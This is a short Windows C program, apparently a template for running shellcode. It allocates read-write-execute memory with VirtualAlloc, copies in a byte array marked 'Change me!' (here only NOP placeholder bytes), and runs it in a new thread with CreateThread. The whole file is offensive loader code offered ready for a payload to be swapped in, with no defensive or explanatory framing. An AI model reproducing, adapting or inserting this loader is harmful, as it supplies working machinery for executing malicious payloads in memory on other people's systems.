#include <windows.h>
#include <stdio.h>

int main() {
	// Change me!
	unsigned char shellcode[] =
	  { 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 };

	LPVOID basePageAddress;

	// Allocate memory
	basePageAddress = VirtualAlloc(
		NULL,						//LPVOID lpAddress,
		(SIZE_T)sizeof(shellcode),	//SIZE_T dwSize,
		MEM_COMMIT | MEM_RESERVE,	//DWORD  flAllocationType,
		PAGE_EXECUTE_READWRITE		//DWORD  flProtect
	);

	if (basePageAddress == NULL) {
		printf("[x] Could not allocate memory. Error: %d", GetLastError());
		return 1;
	}

	// Write memory
	memcpy(
		basePageAddress,		//void *dest,
		&shellcode,			//const void *src,
		(size_t)sizeof(shellcode)	//size_t count
	);

	// Create thread that points to shellcode
	CreateThread(
		NULL,						//LPSECURITY_ATTRIBUTES   lpThreadAttributes,
		NULL,						//SIZE_T                  dwStackSize,
		(LPTHREAD_START_ROUTINE)basePageAddress,	//LPTHREAD_START_ROUTINE  lpStartAddress,
		NULL,						//__drv_aliasesMem LPVOID lpParameter,
		0,						//DWORD                   dwCreationFlags,
		NULL						//LPDWORD                 lpThreadId
	);

	// Wait for new thread to spawn
	Sleep(1000);
	
	
	return 0;
}
